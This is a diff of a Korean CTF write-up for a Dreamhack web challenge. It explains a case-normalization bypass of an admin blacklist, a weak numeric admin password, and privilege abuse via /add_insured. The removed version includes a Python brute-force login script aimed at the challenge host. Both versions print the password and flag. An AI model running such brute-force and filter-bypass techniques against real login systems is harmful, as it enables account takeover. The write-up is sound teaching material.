@@ -1,79 +1,39 @@
----
-layout: post
-title: "[Dreamhack] TRAUMA TEAM - LOGIN Write-up"
-date: 2026-04-10 10:30:00 +0900
-categories: [CTF, Reversing, Web]
----
-
-드림핵(Dreamhack) 웹해킹 CTF 문제인 **TRAUMA TEAM - LOGIN** 풀이 라이트업임.
-
----
-
 # [Dreamhack] TRAUMA TEAM - LOGIN Write-up
 
-## 1. 문제 분석
-로그인 페이지가 주어지고, 소스코드를 보면 최종 목표는 `gloria martinez` 계정으로 로그인했을 때 보험 가입 상태(`is_insured`)가 `True`여야 플래그가 출력됨.
+- **Date:** 2026-04-10
+- **Category:** Web Hacking
+- **Tags:** #Authentication_Bypass #Brute_Force #Case_Normalization #Logic_Vulnerability
 
-### 소스코드 핵심 포인트
-```python
-# 관리자 비밀번호가 너무 취약함 (0~2000 사이 숫자)
-ADMIN_PW = str(random.randint(0, 2000)).zfill(5)
+## 1. Problem Description
+"TRAUMA TEAM INTERNATIONAL MEDICAL PORTAL"
+로그인 서비스에서 관리자 계정을 탈취하여 특정 유저(`gloria martinez`)를 보험에 가입시키고 플래그를 획득하는 문제입니다.
 
-# 유저 데이터
-users = {
-    "admin": {"pw": ADMIN_PW, "money": 999999, "is_insured": True},
-    "gloria martinez": {"pw": "P@ssw0rd", "money": 10, "is_insured": False}
-}
+## 2. Vulnerability Analysis
 
-# 로그인 로직 - 대소문자 우회 취약점
-if user_input == "admin":
-    flash("H4cker.. dont access my account!")
-    return redirect(url_for('index'))
+### A. Identifier Normalization Bypass
+- **Filtering Logic:** `if user_input == "admin":` 구문으로 직접적인 `admin` 접근을 차단합니다.
+- **Normalization:** 필터링 이후 `(user_input.upper()).lower()` 처리를 수행합니다.
+- **Bypass:** `admIn`, `ADMIN` 등 대소문자가 섞인 입력값은 첫 번째 필터링을 통과하지만, 최종적으로는 `admin` 계정으로 정규화되어 로그인이 가능해집니다.
 
-user_input = (user_input.upper()).lower() # 여기서 admin으로 변환됨
-```
+### B. Weak Administrative Credentials
+- **Password Generation:** `ADMIN_PW = str(random.randint(0, 2000)).zfill(5)`
+- **Vulnerability:** 관리자 비밀번호가 00000부터 02000 사이의 5자리 숫자로 고정되어 있습니다. 전체 경우의 수가 2,001개에 불과하여 브루트 포스(Brute Force) 공격에 매우 취약합니다.
 
-- `gloria martinez`는 돈이 10밖에 없어서 스스로 보험을 못 삼(보험료 20,000).
-- `admin` 계정은 `/add_insured` 엔드포인트를 통해 다른 유저를 강제로 보험에 가입시킬 수 있음.
-- 근데 `id`가 `admin`이면 로그인을 막아놨음. 하지만 `upper().lower()` 처리를 하기 때문에 `admIn`이나 `ADMIN`으로 입력하면 필터를 통과하고 실제로는 `admin` 계정으로 로그인됨.
+### C. Administrative Privilege Abuse
+- **Endpoint:** `/add_insured`
+- **Logic:** `session.get('user') == 'admin'` 권한을 확인한 뒤, 지정된 유저의 `is_insured` 상태를 `True`로 변경합니다.
+- **Impact:** 관리자 계정 탈취 후 이 기능을 이용해 목표 대상인 `gloria martinez`를 보험에 강제 등록시킬 수 있습니다.
 
-## 2. 취약점 요약
-1.  **ID 필터링 우회:** 대소문자 섞어서 입력하면 `admin` 계정 접근 가능.
-2.  **Weak Password (Brute Force):** 관리자 패스워드가 00000~02000 사이라 금방 뚫림.
-3.  **관리자 권한 남용:** 관리자로 로그인해서 글로리아를 보험에 가입시키면 끝.
+## 3. Exploit Path
 
-## 3. 익스플로잇 (Exploit)
+1. **Bypass & Brute Force:** `id=admIn`으로 고정하고 `pw=00000~02000` 범위를 탐색하여 관리자 비밀번호를 획득합니다. (본 문제에서는 `01106`으로 확인됨)
+2. **Admin Login:** 획득한 자격 증명으로 로그인하여 관리자 세션을 확보합니다.
+3. **Insurance Enrollment:** 관리자 메뉴 혹은 `/add_insured?target=gloria martinez` 직접 호출을 통해 대상 유저를 보험에 등록합니다.
+4. **Flag Acquisition:** `gloria martinez` / `P@ssw0rd` 계정으로 로그인하여 대시보드 상단에 활성화된 플래그를 확인합니다.
 
-### STEP 1: 관리자 계정 브루트 포스
-`id`를 `admIn`으로 고정하고 패스워드를 00000부터 02000까지 돌려봄.
+## 4. Lesson Learned
+- 블랙리스트 기반의 필터링은 입력값 정규화 로직이 뒤따를 경우 쉽게 무력화될 수 있습니다. (White-list 권장)
+- 관리자 계정과 같은 핵심 자산에 대해 충분한 복잡성을 갖지 않는 무작위 비밀번호 생성 로직을 사용하는 것은 위험합니다.
 
-```python
-import requests
-
-url = "http://host3.dreamhack.games:11260/login"
-for i in range(2001):
-    pw = str(i).zfill(5)
-    data = {"id": "admIn", "pw": pw}
-    r = requests.post(url, data=data, allow_redirects=False)
-    
-    # 로그인 성공 시 index로 리다이렉트됨
-    if r.status_code == 302 and "login" not in r.headers.get("Location", ""):
-        print(f"Admin PW Found: {pw}")
-        break
-```
-- 실행 결과, 패스워드는 **`01106`**이었음.
-
-### STEP 2: 보험 가입 및 플래그 획득
-1.  `admIn` / `01106`으로 로그인 성공.
-2.  관리자 전용 기능인 `ENROLL SUBJECT`에 `gloria martinez` 입력하고 실행.
-    - 요청 URL: `/add_insured?target=gloria martinez`
-3.  로그아웃 후 `gloria martinez` / `P@ssw0rd`로 재로그인.
-4.  대시보드 상단에 플래그 출력됨.
-
-## 4. 결과
-- **Flag:** `SP{Bu1_1tS_t0O_l41te_glorya}`
-
----
-
-### 느낀점
-`upper().lower()`를 이용한 대소문자 우회는 꽤 자주 나오는 패턴인 듯. 비밀번호 범위가 좁으면 일단 브루트 포스부터 박고 보는 게 답인 것 같음. 끝.
+## 5. Flag
+`SP{Bu1_1tS_t0O_l41te_glorya}`
